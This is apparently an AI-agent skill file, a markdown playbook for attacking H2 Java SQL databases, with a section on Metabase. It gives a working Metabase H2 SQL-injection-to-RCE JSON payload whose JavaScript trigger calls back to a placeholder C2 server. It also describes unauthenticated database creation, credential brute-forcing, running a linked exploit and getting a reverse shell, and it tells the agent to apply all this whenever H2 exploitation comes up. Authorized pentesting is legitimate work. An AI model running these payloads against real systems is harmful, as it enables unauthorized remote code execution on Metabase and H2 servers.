---
name: h2-database-pentesting
description: H2 Java SQL database pentesting and exploitation. Use this skill whenever the user mentions H2 database, Java SQL database vulnerabilities, database SQL injection to RCE, unauthenticated database access, or any scenario involving H2 database exploitation. This includes Metabase H2 attacks, database credential testing, and SQL injection payloads targeting H2 databases.
---

# H2 Database Pentesting

A skill for testing and exploiting H2 Java SQL database vulnerabilities.

**⚠️ Authorization Required**: Only use these techniques on systems you own or have explicit written permission to test.

## Overview

H2 is an in-memory Java SQL database commonly used in applications like Metabase. It has several attack vectors including unauthenticated database creation, SQL injection to RCE, and direct database access exploitation.

## Attack Vectors

### 1. Unauthenticated Database Creation

H2 allows creating new databases without valid credentials by specifying a non-existent database name.

**When to use**: When you have access to an H2 console or connection interface and want to create a database without authentication.

**How it works**:
- Connect to H2 with a non-existent database name
- H2 will create the database automatically without requiring credentials
- This bypasses authentication entirely

**Example connection string**:
```
jdbc:h2:tcp://localhost:9092/NEW_DATABASE_NAME
```

### 2. Authenticated Database Access

If you know the database name and credentials, you can access existing H2 databases directly.

**When to use**: When you have discovered database credentials through other means (config files, environment variables, etc.)

**Connection format**:
```
jdbc:h2:tcp://<host>:<port>/<database_name>
```

### 3. SQL Injection to RCE

H2 databases can be exploited via SQL injection to achieve remote code execution (RCE).

**When to use**: When you've identified an SQL injection vulnerability in an application using H2 as its backend.

**Metabase H2 RCE Payload**:

This payload exploits H2's ability to execute JavaScript within SQL triggers:

```json
{
  "details": {
    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://<YOUR_C2_SERVER>/callback').openConnection().getContentLength()\n$$--=x;",
    "advanced-options": false,
    "ssl": true
  }
}
```

**How to adapt this payload**:
1. Replace `<YOUR_C2_SERVER>` with your callback server URL
2. Adjust the callback path as needed for your setup
3. The payload creates a trigger that executes JavaScript when tables are queried
4. The JavaScript makes an outbound HTTP request to your server

### 4. Direct H2 RCE Exploitation

If you have direct access to communicate with an H2 database, you can use known exploits for RCE.

**Reference**: [H2 RCE Exploit](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

**When to use**: When you have established a connection to an H2 database and want to escalate to code execution.

## Testing Workflow

### Step 1: Reconnaissance

1. Identify if the target uses H2 database:
   - Check application technology stack
   - Look for H2 console endpoints (`/h2-console`, `/h2-console/*`)
   - Examine error messages for H2-specific errors
   - Check for Metabase installations (commonly uses H2)

2. Determine access method:
   - Is there an exposed H2 console?
   - Are there SQL injection points?
   - Do you have database credentials?

### Step 2: Access Testing

**Test unauthenticated creation**:
```
# Try connecting with a new database name
jdbc:h2:tcp://<target>:9092/test_new_db
```

**Test with known credentials**:
```
# Use discovered credentials
jdbc:h2:tcp://<target>:9092/<known_db>
# Username: <username>
# Password: <password>
```

### Step 3: Exploitation

**If SQL injection is present**:
1. Use the Metabase payload template above
2. Set up a callback listener on your C2 server
3. Trigger the injection point
4. Monitor for callback

**If direct database access is available**:
1. Connect to the H2 database
2. Execute the RCE exploit from the reference gist
3. Establish reverse shell or command execution

## Common Scenarios

### Metabase H2 Exploitation

Metabase often ships with H2 as the default database. If you find an exposed Metabase instance:

1. Check if it's using H2 (default for small deployments)
2. Look for SQL injection in the web interface
3. Use the H2 SQL injection to RCE payload
4. Gain access to the underlying system

### Exposed H2 Console

If you find an exposed H2 console:

1. Try unauthenticated database creation
2. If that fails, attempt credential brute-forcing
3. Once connected, explore the database schema
4. Look for sensitive data or RCE opportunities

## Safety and Ethics

- **Always obtain written authorization** before testing
- **Document your findings** for the authorized party
- **Avoid destructive actions** during testing
- **Respect scope boundaries** defined in your authorization
- **Report vulnerabilities responsibly**

## References

- [H2 Database Official Documentation](https://www.h2database.com/html/main.html)
- [H2 RCE Exploit Gist](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)
- [Metabase H2 Pre-Auth RCE](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)

## Quick Reference

| Attack Vector | Prerequisites | Impact |
|--------------|---------------|--------|
| Unauthenticated DB Creation | H2 console access | Database creation |
| Authenticated Access | DB credentials | Full database access |
| SQL Injection to RCE | SQLi vulnerability | Remote code execution |
| Direct H2 RCE | Database connection | Remote code execution |

---

**Remember**: These techniques are for authorized security testing only. Unauthorized access to computer systems is illegal.
